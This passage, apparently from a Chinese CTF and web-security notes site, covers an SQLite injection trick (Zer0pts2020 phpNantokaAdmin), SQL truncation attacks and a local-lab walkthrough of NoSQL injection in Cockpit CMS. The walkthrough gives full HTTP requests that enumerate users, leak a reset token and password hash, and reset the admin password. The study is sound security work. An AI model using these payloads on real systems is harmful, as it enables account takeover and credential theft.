<p>\u662fsqlite\u81ea\u8eab\u7684\u6027\u8d28\uff0c\u901a\u8fc7\u95ed\u5408\u6765\u5f3a\u884c\u62fc\u51d1\u51fasql\u6ce8\u5165\u7684\u8bed\u53e5\u3002</p> <p>\u6211\u4eec\u5728\u4f7f\u7528sqlite_master\u65f6\u4f7f\u7528\u9519\u8bef\u7684\u8bed\u6cd5\uff0csqlite\u5c06\u4f1a\u5ffd\u7565\u540e\u9762\u5217\u7684\u540d\u79f0\uff0c\u65e0\u8bba\u5217\u7684\u540d\u79f0\u662f\u5426\u771f\u5b9e\u7684\u5b58\u5728\uff0c\u9664\u975e\u5728\u5217\u4e4b\u95f4\u653e\u7f6e\u3002</p> <p>select\u7684\u65f6\u5019\uff0c\u5f53\u5217\u540d\u7528\u7a7a\u767d\u5b57\u7b26\u9694\u5f00\u65f6\uff0csqlite\u53ea\u4f1a\u628a\u7a7a\u683c\u4e4b\u524d\u7684\u5b57\u7b26\u5f53\u505a\u5217\u540d\uff0c\u5e76\u4e14\u5ffd\u89c6\u7a7a\u683c\u540e\u7684\u5b57\u7b26</p> <p></p> <p>[]\u548c'\u3001\"\u3001`\u3001\u4e00\u6837\u53ef\u4ee5\u5305\u88f9\u5217\u540d</p> <p></p> <p>select [id][fdas3\"`] from test</p> <p>//1</p> <p>select [id]\"dgfsgfs\" from test</p> <p>//1</p> <p>select [id]fdas from test</p> <p>//1</p> <p>\u7b2c\u4e00\u4e2a\u5217\u540d\u53ef\u4ee5\u6b63\u5e38\u8bfb\u53d6\u3002\u7b2c\u4e8c\u4e2a\u5c31\u4f1a\u81ea\u52a8\u5ffd\u7565</p> <p>\" ' ` [] \u90fd\u53ef\u4ee5\u6b63\u5e38\u5305\u88f9\u5217\u540d</p> <p>insert\u8bed\u53e5\u4e5f\u5dee\u4e0d\u591a</p> <p>$sql = \"CREATE TABLE [aaa] as select [sql][ (dummy1TEXT, dummy2 TEXT, <code>]from sqlite_master;</code> 2);\";</p> <p>\u7b49\u4e8e</p> <p>create table [aaa] as select sql from sqlite_master</p> <p>\u67e5\u627esqlite_master\u4e2dsql\u5217\u7684\u503c\u653e\u5165aaa\u8868\u4e2d</p> <p>creat table [aaa] as select sql as[dummy1TEXT, dummy2 TEXT(table_name\u4f20\u53c2\u5185\u5bb9)&amp;columns[0][name]=]from sql_master;\u8fd9\u91cc\u662f\u7b2c\u4e00\u79cd\u89e3\u91ca\u7684\u65b9\u6cd5</p> <p>\u9898\u76ee\u6765\u6e90</p>"},{"location":"web/sql/sqlite/#zer0pts2020phpnantokaadmin","title":"[Zer0pts2020]phpNantokaAdmin","text":"<p>\u8fd9\u662f\u4e00\u9053sqlite\u6ce8\u5165\u7684\u9898\u76ee\uff0c\u8003\u5bdf\u70b9\uff1a\u6211\u4eec\u5728\u4f7f\u7528sqlite_master\u65f6\u4f7f\u7528\u9519\u8bef\u7684\u8bed\u6cd5\uff0csqlite\u5c06\u4f1a\u5ffd\u7565\u540e\u9762\u5217\u7684\u540d\u79f0\uff0c\u65e0\u8bba\u5217\u7684\u540d\u79f0\u662f\u5426\u771f\u5b9e\u7684\u5b58\u5728\uff0c\u9664\u975e\u5728\u5217\u4e4b\u95f4\u653e\u7f6e\u3002\uff1a</p> <p>table_name=[aaa] as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2</p> <p>sql = \"CREATE TABLE {table_name} (\";</p> <p>$sql .= \"dummy1 TEXT, dummy2 TEXT\";</p> <p>\u633a\u795e\u5947\u7684\uff0c\u9996\u5148\u4f7f\u7528[aaa]\u6765\u76f8\u5f53\u4e8e\u8986\u76d6\u6389sql.\u540e\u7684dummy1,dummy2\uff0c\u7531\u4e8e\u5355\u6b21\u4f20\u9012\u6570\u636e\u5b57\u7b26\u6570\u91cf\u7684\u9650\u5236\uff0c\u5728[]\u4e2d\u6211\u4eec\u4f20\u9012&amp;columns\u6765\u62fc\u63a5\u4f20\u9012\u8d85\u51fa\u5b57\u7b26\u7684\u51fd\u6570\uff0c\u4f46\u662f\u5728\u5b9e\u9645sqlite\u8fdb\u884c\u89e3\u6790\u7684\u65f6\u5019\uff0c\u53c8\u7531\u4e8e\u5728[]\u4e4b\u540e\u88ab\u5ffd\u7565\u3002\u6700\u540e\u76f8\u5f53\u4e8e\uff1a</p> <p>creat table [aaa]as select sql from sqlite_master;</p> <p>creat table [aaa] as select sql as[dummy1 TEXT, dummy2 TEXT(table_name\u4f20\u53c2\u5185\u5bb9)&amp;columns[0][name]=]from sql_master;</p> <p>\u627e\u5230\u53e6\u5916\u4e00\u79cd\u89e3\u91ca:select\u7684\u65f6\u5019\uff0c\u5f53\u5217\u540d\u7528\u7a7a\u767d\u5b57\u7b26\u9694\u5f00\u65f6\uff0csqlite\u53ea\u4f1a\u628a\u7a7a\u683c\u4e4b\u524d\u7684\u5b57\u7b26\u5f53\u505a\u5217\u540d\uff0c\u5e76\u4e14\u5ffd\u89c6\u7a7a\u683c\u540e\u7684\u5b57\u7b26</p> <p>payload\u5c31\u4e3a\uff1a[aaa]as select [sql][&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2</p>"},{"location":"web/sql/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E7%9A%84sql%E6%94%BB%E5%87%BB/","title":"\u57fa\u4e8e\u7ea6\u675f\u7684sql\u653b\u51fb","text":"<p>\u9996\u5148\u7ed9\u51fa\u4e0d\u662fsql\u6ce8\u5165\u7684sql</p> <p>\u7a0d\u5fae\u63cf\u8ff0\u4e00\u4e0b\uff1a\u5c31\u662f\u8bf4\uff0c\u5f53\u6211\u9650\u5b9asql\u4e2d\u67d0\u4e00\u4e2a\u53d8\u91cf\u7684\u503c\u7684\u957f\u5ea6\u65f6\uff0c\u82e5\u53d8\u91cf\u957f\u5ea6\u7684\u503c\u5c0f\u4e8e\u8be5\u503c\uff0c\u90a3\u4e48sql\u5728\u505a\u6bd4\u8f83\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u586b\u5145\u7a7a\u683c\u5206\u5272\u7b26\uff0c\u5f53\u53d8\u91cf\u7684\u957f\u5ea6\u5927\u4e8e\u8be5\u503c\u7684\u65f6\u5019\uff0c\u90a3\u4e48sql\u4f1a\u81ea\u52a8\u5730\u622a\u53d6\u8be5\u503c\u7684\u957f\u5ea6\u3002</p> <p>\u6bd4\u5982\u8bf4\u9650\u5236\u4e3a10\uff0c\u4e5f\u5c31\u662f\u8bfb10\u4f4d</p> <p>\u8f93\u5165100000\u5c31\u4f1a\u53d8\u6210100000%20%20%20%20\uff08%20\u5c31\u662f\u7a7a\u683c\uff09</p> <p>1145141919810\u5c31\u4f1a\u53d8\u62101145141919\uff0c\u540e\u9762\u76841919\u88ab\u622a\u65ad\u7b49\u629b\u5f03\u4e86</p> <p>1\u3001\u65b0\u5efa\u8868\u683c\u540d\u5b57\u4e3auser\uff0c\u8be5\u8868\u7684\u7ea6\u675f\u7684\u662f\u540d\u5b57\u548c\u5bc6\u7801\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc710</p> <pre><code>create table user(id int primary key auto_increment,//id\u5b57\u6bb5\uff0cint\u7c7b\u578b\uff0c\u5173\u952e\u5b57\uff0c\u81ea\u52a8\u589e\u52a0name varchar(10) not null,//name\u5b57\u6bb5\uff0c\u5b57\u7b26\u4e32\uff0c\u4e0d\u5141\u8bb8\u4e3a\u7a7apass varchar(10) not null)//year\u5b57\u6bb5\uff0cint\u7c7b\u578b\uff0c\u4e0d\u5141\u8bb8\u4e3a\u7a7a\nPlain Text\n</code></pre> <p>2\u3001\u63d2\u5165\u4e24\u6761\u6b63\u5e38\u6570\u636e</p> <pre><code>insert into user (name,pass) values (\"aiyou\",123456);insert into user (name,pass) values (\"admin\",123456);\nPlain Text\n</code></pre> <p>3\u3001\u63d2\u5165\u957f\u5ea6\u5927\u4e8e10\u7684\u7528\u6237\u540d</p> <pre><code>insert into user (name,pass) values (\"admin123456789\",123456);\nPlain Text\n</code></pre> <p>4\u3001\u67e5\u770b\u63d2\u5165\u7684\u6570\u636e\uff0c\u53d1\u73b0\u53ea\u4fdd\u7559\u4e86\u5341\u4e2a\u5b57\u7b26</p> <p></p> <p>5\u3001\u518d\u63d2\u5165\u4e00\u6761\u52a0\u7a7a\u683c\u7684\u7528\u6237\u540d\uff0c\u53d1\u73b0\u548c\u4e0d\u52a0\u7a7a\u683c\u63d2\u5165\u7684admin\u4e00\u6837</p> <p></p> <p>[SKCTF]login1</p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/","title":"NOSQL\u6ce8\u5165","text":"<p>\u5728\u7f51\u7edc\u653b\u51fb\u65b9\u6cd5\u4e2d\uff0cSQL\u6ce8\u5165\u4e00\u76f4\u662f\u6700\u6d41\u884c\u7684\u653b\u51fb\u4e4b\u4e00\uff0c\u968f\u7740NoSQL\u6570\u636e\u5e93\uff0c\u5982MongoDB\u3001Redis\u7684\u51fa\u73b0\uff0c\u4f20\u7edf\u7684SQL\u6ce8\u5165\u4e0d\u518d\u53ef\u884c\u3002\u4f46\u662f\u8fd9\u5e76\u4e0d\u610f\u5473\u7740NoSQL\u6570\u636e\u5e93\u5c31\u767e\u5206\u767e\u5b89\u5168\u3002NoSQL\u6ce8\u5165\u6f0f\u6d1e\u7b2c\u4e00\u6b21\u7531Diaspora\u57282010\u5e74\u53d1\u73b0\uff0c\u5230\u73b0\u5728\uff0cNoSQL\u6ce8\u5165\u548cSQL\u6ce8\u5165\u4e00\u6837\uff0c\u5982\u679c\u5f00\u53d1\u8005\u4e0d\u6ce8\u91cd\uff0c\u540c\u6837\u4f1a\u5bf9\u4f01\u4e1a\u670d\u52a1\u5668\u9020\u6210\u81f4\u547d\u5a01\u80c1</p> <p>\u672c\u7740\u5b66\u4e60\u8c03\u8bd5\u65b9\u6cd5\u7684\u6001\u5ea6\uff0c\u6765\u5728\u672c\u5730\u505a\u4e00\u4e2a\u6d4b\u8bd5\uff0c\u4f7f\u7528\u5230\u7684\u662fCockpitCMS.</p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#_1","title":"\u90e8\u7f72","text":"<p>dockerfile:</p> <pre><code>FROM php:7.3-apache\n\nRUN apt-get update \\\n    &amp;&amp; apt-get install -y \\\n        wget zip unzip \\\n        libzip-dev \\\n        libfreetype6-dev \\\n        libjpeg62-turbo-dev \\\n        libpng-dev \\\n        sqlite3 libsqlite3-dev \\\n        libssl-dev \\\n    &amp;&amp; pecl install mongodb \\\n    &amp;&amp; pecl install redis \\\n    &amp;&amp; docker-php-ext-configure gd --with-freetype-dir=/usr/include/ --with-jpeg-dir=/usr/include/ \\\n    &amp;&amp; docker-php-ext-install -j$(nproc) iconv gd pdo zip opcache pdo_sqlite \\\n    &amp;&amp; a2enmod rewrite expires\n\nRUN echo \"extension=mongodb.so\" &gt; /usr/local/etc/php/conf.d/mongodb.ini\nRUN echo \"extension=redis.so\" &gt; /usr/local/etc/php/conf.d/redis.ini\n\nRUN chown -R www-data:www-data /var/www/html\n\nVOLUME /var/www/html\n\nCMD [\"apache2-foreground\"]\n</code></pre> <p><code>https://github.com/agentejo/cockpit</code></p> <p>\u4f9d\u6b21\u6267\u884c\u4ee5\u4e0b\u7684\u547d\u4ee4</p> <pre><code>docker build -t cockpit .\ndocker ps\ndocker run -i -p 8080:80 -d ImigeID\ndocker exec -it containerID /bin/bash #\u5230\u8fd9\u4e00\u6b65\u4e4b\u540e\u5e94\u8be5\u662f\u5df2\u7ecf\u8fdb\u5165\u4e86docker\u865a\u62df\u673a\u5185\napt-get install git\ngit clone https://github.com/agentejo/cockpit\nls\ncd cockpit/\nchmod -R 777 *  #\u6539\u6743\u9650\uff0c\u4e0d\u7136\u4f1a\u63d0\u793a\u62a5\u9519\n</code></pre> <p></p> <p>\u4e4b\u540e\u8bbf\u95ee<code>http://127.0.0.1:8080/cockpit/install</code>\u63d0\u793a\u5b89\u88c5\u5b8c\u6210\u5e76\u7ed9\u4e86\u6211\u4eec\u521d\u59cb\u8fdb\u5165\u8d26\u53f7\u5bc6\u7801admin/admin</p> <p>\u8bbf\u95ee</p> <pre><code>http://127.0.0.1:8080/cockpit/auth/login?to=/index.php\n</code></pre> <p>\u8fdb\u5165\u767b\u5f55\u754c\u9762\uff1a</p> <p></p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#authcheck","title":"/auth/check","text":"<p>\u6253\u5f00burpsuite,\u6293\u53d6\u4e00\u4e2aPOST\u5305</p> <p>\u5c06POST\u5185\u5bb9\u6539\u4e3a\uff1a</p> <pre><code>{\"auth\":{\"user\":{\"$eq\":\"admin\"},\"password\":[0]},\"csrf\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc3JmIjoibG9naW4ifQ.v9zlTboG-wFROPUcWj5kSE07IvKkz0IMjiIU0q9ZLR0\"}\u3001\n</code></pre> <p>\u5f97\u5230\u56de\u663e\uff1a</p> <p></p> <p>ps:\u7531\u4e8e\u6f0f\u6d1e\u88ab\u4fee\u590d\u7684\u539f\u56e0\uff0c\u4f60\u9700\u8981\u8fdb\u5165cockpit/modules/Cockpit/Controller/Auth.php\u5220\u6389\u7b2c\u4e00\u4e2a\u5206\u652f\u8fc7\u6ee4\uff1a</p> <p></p> <p>\u7136\u540e\u6211\u4eec\u518d\u6765\u770b\u770b\u4f4d\u4e8e/cockpit/moudles/Cockpit/module/auth.php\u7684\u6e90\u4ee3\u7801\uff1a</p> <pre><code>&lt;?php\n/**\n * This file is part of the Cockpit project.\n *\n * (c) Artur Heinze - \ud83c\udd70\ud83c\udd76\ud83c\udd74\ud83c\udd7d\ud83c\udd83\ud83c\udd74\ud83c\udd79\ud83c\udd7e, http://agentejo.com\n *\n * For the full copyright and license information, please view the LICENSE\n * file that was distributed with this source code.\n */\n\n// Auth Api\n$this-&gt;module('cockpit')-&gt;extend([\n\n    'authenticate' =&gt; function($data) use($app) {\n\n        $data = array_merge([\n            'user'     =&gt; '',\n            'email'    =&gt; '',\n            'group'    =&gt; '',\n            'password' =&gt; ''\n        ], $data);\n\n        if (!$data['password']) return false;\n\n        $filter = ['active' =&gt; true];\n\n        if ($data['email']) {\n            $filter['email'] = $data['email'];\n        } else {\n            $filter['user'] = $data['user'];\n        }\n\n        $user = $app-&gt;storage-&gt;findOne('cockpit/accounts', $filter);\n\n        if ($user &amp;&amp; password_verify($data['password'], $user['password'])) {\n\n            $user = array_merge($data, (array)$user);\n\n            unset($user['password']);\n\n            return $user;\n        }\n\n        return false;\n    }\n    \u4ee5\u4e0b\u7701\u7565...........\n</code></pre> <p>\u5728<code>modules/Cockpit/module/auth.php</code>\u6587\u4ef6\u7684\u7b2c33\u884c\uff0c\u9996\u5148\uff0c\u7a0b\u5e8f\u4f1a\u67e5\u627e\u7528\u6237\u662f\u5426\u5b58\u5728\u7528\u6237\u662f\u5426\u5b58\u5728\uff0c\u53ea\u6709\u5728\u7528\u6237\u5b58\u5728\u7684\u60c5\u51b5\u4e0b\uff0c\u624d\u4f1a\u6267\u884c\u7b2c35\u884cif\u6761\u4ef6\u53e5\u4e2d\u7684<code>password_verify()</code>\u903b\u8f91\uff08<code>&amp;&amp;</code>\u8fd0\u7b97\u7b26\u662f\u77ed\u8def\u6c42\u503c\uff0c\u6216\u8005\u8bf4\u662f\u60f0\u6027\u6c42\u503c\uff09\u3002\u6240\u4ee5\u5982\u679c\u8fd4\u56de\u7684\u7ed3\u679c\u662fpassword_verify() expects parameter 1 to be string\uff0c\u5219\u8bf4\u660e\uff0c<code>$user = admin</code>\u5728\u6570\u636e\u5e93\u4e2d\u662f\u5b58\u5728\u7684\uff0c<code>$app-&gt;storage-&gt;findOne()</code>\u6210\u529f\u8fd4\u56de\u4e86\u67e5\u8be2\u7ed3\u679c\u3002</p> <p>\u800c\u4e0a\u8ff0\u6f0f\u6d1e\u7684\u5173\u952e\u70b9\u5728\u4e8e\uff0cfilter['user']\u4ecedata['user']\u83b7\u53d6\u5230\u4e4b\u540e\uff0c\u5728\u88ab\u4f20\u5165$app-&gt;storage-&gt;findOne\u8fdb\u884c\u6570\u636e\u5e93\u67e5\u8be2\u4e4b\u524d\uff0c\u5b8c\u5168\u6ca1\u6709\u7ecf\u8fc7\u8fc7\u6ee4\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7MongoDB\u64cd\u4f5c\u7b26\u6765\u8fdb\u884cNoSQL \u6ce8\u5165\u3002(\u5c31\u662f\u521a\u624d\u5220\u9664\u7684\u90a3\u4e00\u90e8\u5206)</p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#eq","title":"$eq","text":"<p><code>$eq</code>\u8868\u793aequal\u3002\u662fMongoDB\u4e2d\u7684\u6bd4\u8f83\u64cd\u4f5c\u7b26\u3002</p> <p>\u8bed\u6cd5\uff1a</p> <pre><code>{\n&lt;field&gt;: { $eq: &lt;value&gt; }\n}\n</code></pre>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#regex","title":"$regex","text":"<p><code>$regex</code>\u662fMongoDB\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u64cd\u4f5c\u7b26\uff0c\u7528\u6765\u8bbe\u7f6e\u5339\u914d\u5b57\u7b26\u4e32\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002<code>$regex</code>\u64cd\u4f5c\u7b26\u662f\u5728MongoDB\u76f2\u6ce8\u4e2d\u6700\u7ecf\u5e38\u88ab\u4f7f\u7528\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u5b83\u6765\u4e00\u4e2a\u4e00\u4e2a\u5b57\u7b26\u5730\u7206\u7834\u6570\u636e\u5e93\u3002</p> <p>\u8bed\u6cd5\uff1a</p> <pre><code>{\n&lt;field&gt;: { $regex: /pattern/, $options: '&lt;options&gt;' } }\n{\n&lt;field&gt;: { $regex: 'pattern', $options: '&lt;options&gt;' }\n}\n{\n&lt;field&gt;: { $regex: /pattern/&lt;options&gt;}\n}\n</code></pre> <p>\u5176\u4e2d<code>&lt;options&gt;</code>\u662f\u6a21\u5f0f\u4fee\u6b63\u7b26\uff0c\u5728MongoDB\u4e2d\u5305\u542b<code>i</code>\uff0c<code>m</code>\uff0c<code>x</code>\u548c<code>s</code>\u56db\u4e2a\u9009\u9879\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u7528<code>$regex</code>\u8fdb\u884c\u76f2\u6ce8\uff0c\u6765\u731c\u6d4b\u7528\u6237\u540d\uff0c\u6bd4\u5982\uff1a</p> <pre><code>POST /cockpit/auth/check HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nContent-Type: application/json; charset=UTF-8\nContent-Length: 169\nConnection: close\n\n{\n    \"auth\":{\n        \"user\":{\n            \"$regex\": \"a.*\"\n        },\n        \"password\":[\n            0\n        ]\n    },\n    \"csfr\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc\"\n}\n</code></pre> <p></p> <p>\u8bf4\u660e\u7528\u6237\u540d\u4ee5<code>a</code>\u5f00\u5934\u7684\u7528\u6237\u5b58\u5728\u3002</p> <p><code>\"$regex\": \"ab.*\"</code>\uff1a</p> <p></p> <p>\u4ee5<code>ab</code>\u5f00\u5934\u7684\u7528\u6237\u4e0d\u5b58\u5728\uff0c\u90a3\u8fd4\u56de\u7684\u4fe1\u606f\u81ea\u7136\u662fUser not found\u3002</p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#nin","title":"$nin","text":"<p><code>$nin</code>\u8868\u793a\u67e5\u8be2\u65f6\u4e0d\u5339\u914d\u6570\u7ec4\u4e2d\u7684\u503c\uff0c\u8bed\u6cd5\uff1a</p> <pre><code>{\n    field: { $nin: [ &lt;value1&gt;, &lt;value2&gt;, ..., &lt;valueN&gt; ] }\n}\n</code></pre> <p>payload\uff1a</p> <pre><code>{\n    \"auth\":{\n        \"user\":{\n            \"$nin\": [\n                \"admin\",\n                \"Poseidon\",\n                \"Sirens\"\n            ],\n            \"$regex\": \"Co.*\"\n        },\n        \"password\":[\n            0\n        ]\n    },\n    \"csfr\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc\"\n}\n</code></pre>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#funcfuncfnf","title":"\u81ea\u5b9a\u4e49func/fn/$f \u64cd\u4f5c\u7b26","text":"<p>\u5728Cockpit\u7684lib/MongoLite/Database.php\u7684<code>evaluate</code>\u51fd\u6570\u4e2d\u91cd\u5199\u548c\u65b0\u589e\u5f88\u591aMongoDB\u64cd\u4f5c\u7b26\uff0c\u5176\u4e2d<code>$func</code>\u3001<code>$fn</code>\u548c<code>$f</code>\u64cd\u4f5c\u7b26\u6bd4\u8f83\u6709\u610f\u601d\uff0c\u56e0\u4e3a\u8be5\u64cd\u4f5c\u7b26\u5141\u8bb8\u8c03\u7528callable PHP\u51fd\u6570\uff1a</p> <p></p> <p><code>$func</code>\u64cd\u4f5c\u7b26\u5e76\u4e0d\u662fMongoDB\u4e2d\u5b9a\u4e49\u7684\u6807\u51c6\u64cd\u4f5c\u7b26\uff0c\u5728Cockpit CMS\u4e2d\uff0c\u8be5\u64cd\u4f5c\u7b26\u53ef\u4ee5\u8c03\u7528\u4efb\u4f55\u5e26\u6709\u5355\u4e2a\u53c2\u6570\u7684PHP\u6807\u51c6\u51fd\u6570\uff0c\u5176\u4e2d<code>$b</code>\u662f\u6211\u4eec\u53ef\u63a7\u7684\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u8fd9\u6837\u7684payload\uff1a</p> <pre><code>{\n    \"auth\":{\n        \"user\":{\n            \"$func\":\"var_dump\"\n        },\n        \"password\":[\n            0\n        ]\n    },\n    \"csfr\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc\"\n}\n</code></pre> <p>https://github.com/agentejo/cockpit/blob/0d01412e1209468c23f0f4c49eccf959059e415e/lib/MongoLite/Database.php#L432</p> <p>\u4ee3\u7801\ud83d\udc46</p> <p>\u4e4b\u540e\u7684\u6f0f\u6d1e\uff0c\u5927\u540c\u5c0f\u5f02\uff0c\u90fd\u662f\u56e0\u4e3a\u8fc7\u6ee4\u51fa\u73b0\u95ee\u9898\u5bfc\u81f4\u7684Nosql\u6ce8\u5165\uff0c\u76f4\u63a5\u5f00\u59cb\u642c\u8fd0\u3002</p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#authrequestreset","title":"/auth/requestreset","text":"<p>\u5728\u5fd8\u8bb0\u767b\u5f55\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\uff0cCockpit\u63d0\u4f9b\u4e86\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\uff0c\u76f8\u5173\u903b\u8f91\u5728<code>modules/Cockpit/Controller/Auth.php</code>\u4e2d\uff0c\u548c\u767b\u5f55\u903b\u8f91\u4e00\u6837\uff0c\u4f20\u5165<code>$this-&gt;app-&gt;storage-&gt;findOne()</code>\u8fdb\u884c\u67e5\u8be2\u7684\u53c2\u6570<code>$query</code>\u5b8c\u5168\u6ca1\u6709\u7ecf\u8fc7\u5904\u7406\uff1a</p> <p></p> <p>\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u76f8\u540c\u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u7528\u6237\u540d\uff1a</p> <pre><code>POST /cockpit/auth/requestreset HTTP/1.1\nHost: your-ip\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://your-ip:8000/cockpit/auth/forgotpassword\nX-Requested-With: XMLHttpRequest\nContent-Type: application/json; charset=UTF-8\nContent-Length: 33\nConnection: close\nCookie: 8071dec2be26139e39a170762581c00f=e0050af94b1d4e88d31e7695c2b5142a\n\n{\n    \"user\":{\n        \"$func\":\"var_dump\"\n    }\n}\n</code></pre> <p></p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#authresetpassword","title":"/auth/resetpassword","text":"<p>\u4ece\u524d\u9762\u7684\u4e24\u5904\u6f0f\u6d1e\uff0c\u5df2\u7ecf\u53ef\u4ee5\u5f97\u5230\u540e\u53f0\u7684\u7528\u6237\u8d26\u6237\u540d\u4e86\u3002\u63a5\u7740\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e3\u91cd\u7f6e\u5bc6\u7801\u3002</p> <p>\u91cd\u7f6e\u5bc6\u7801\u529f\u80fd\u5904\u7406\u51fd\u6570\u4e3a<code>resetpassword()</code>\uff0c\u4f4d\u4e8e\u6587\u4ef6<code>modules/Cockpit/Controller/Auth.php</code>\uff1a</p> <p></p> <p>\u5728\u7b2c150\u884c\uff0c<code>$token</code>\u53c2\u6570\u88ab\u4f20\u5165\u67e5\u8be2\u4e4b\u524d\uff0c\u6ca1\u6709\u7ecf\u8fc7\u8fc7\u6ee4\u51c0\u5316\uff0c\u540c\u6837\uff0c\u5728\u8fd9\u6837\u5b58\u5728\u4e00\u4e2a\u76f8\u540c\u7684\u6f0f\u6d1e\uff1a</p> <pre><code>{\n    \"token\":{\n        \"$func\":\"var_dump\"\n    }\n}\n</code></pre> <p></p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#authnewpassword","title":"/auth/newpassword","text":"<p>\u65e0\u72ec\u6709\u5076\uff0c\u5728\u540c\u6587\u4ef6\u7684<code>newpassword</code>\u4e2d\uff0c\u540c\u6837\u6ca1\u6709\u5bf9<code>$token</code>\u53c2\u6570\u505a\u51c0\u5316\uff1a</p> <p></p> <p>\u540c\u6837\u5b58\u5728NoSQL\u6ce8\u5165\u6f0f\u6d1e\uff1a</p> <p></p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#_2","title":"\u83b7\u53d6\u7528\u6237\u5bc6\u7801","text":"<p>\u5f53\u83b7\u53d6\u4e86\u6b63\u786e\u4e86<code>$token</code>\u4e4b\u540e\uff0c\u91cd\u65b0\u8bf7\u6c42<code>auth/newpassword</code>\uff1a</p> <pre><code>POST /cockpit/auth/newpassword HTTP/1.1\nHost: your-ip\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nContent-Type: application/json; charset=UTF-8\nContent-Length: 60\nConnection: close\n\n{\n    \"token\":\"rp-bb6dfcbc16621bf95234355475d53114609bc6e8c336b\"\n}\n</code></pre> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u5f97\u5230\u4e86admin\u7528\u6237\u7684\u90ae\u7bb1\u4fe1\u606f\u548chash\u4e4b\u540e\u7684\u5bc6\u7801\uff01</p> <p>hash\u503c<code>$2y$10$IkeINxb9VlaZUJ5jwyBNdO\\/x8QFlCd1UO8zLiZExGDLVFVJtjyoz6</code>\u662f\u7528PHP built-in\u52a0\u5bc6\u51fd\u6570<code>password_hash</code>\u52a0\u5bc6\u7684\u3002\u5982\u679c\u4f60\u6709\u8db3\u591f\u5927\u7684\u5bc6\u7801\u5e93\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u66b4\u529b\u7834\u89e3\u3002</p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#_3","title":"\u91cd\u7f6e\u7528\u6237\u5bc6\u7801","text":"<p>\u5982\u679c\u4f60\u6ca1\u6709\u90a3\u4e48\u591a\u65f6\u95f4\u6216\u662f\u8bbe\u5907\u7834\u89e3\u5bc6\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9<code>resetpassword</code>\u4e2d\u7684\u6f0f\u6d1e\u6765\u76f4\u63a5\u91cd\u7f6e\u5bc6\u7801\uff1a</p> <pre><code>{\n    \"token\":\"rp-bb6dfcbc16621bf95234355475d53114609bc6e8c336b\",\n    \"password\":\"123456hahha\"\n}\n</code></pre> <p></p> 